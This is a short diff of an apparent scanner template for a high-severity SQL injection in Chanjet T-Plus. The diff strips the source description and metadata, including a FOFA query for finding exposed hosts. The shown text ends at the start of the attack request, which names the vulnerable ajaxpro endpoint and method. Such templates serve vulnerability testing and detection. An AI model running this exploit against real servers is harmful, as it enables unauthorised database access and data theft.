@@ -3,12 +3,8 @@ info:
   name: 畅捷通T-Plus ajaxpro Ufida SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nwcmy61vpie7a9q8'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nwcmy61vpie7a9q8
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList HTTP/1.1
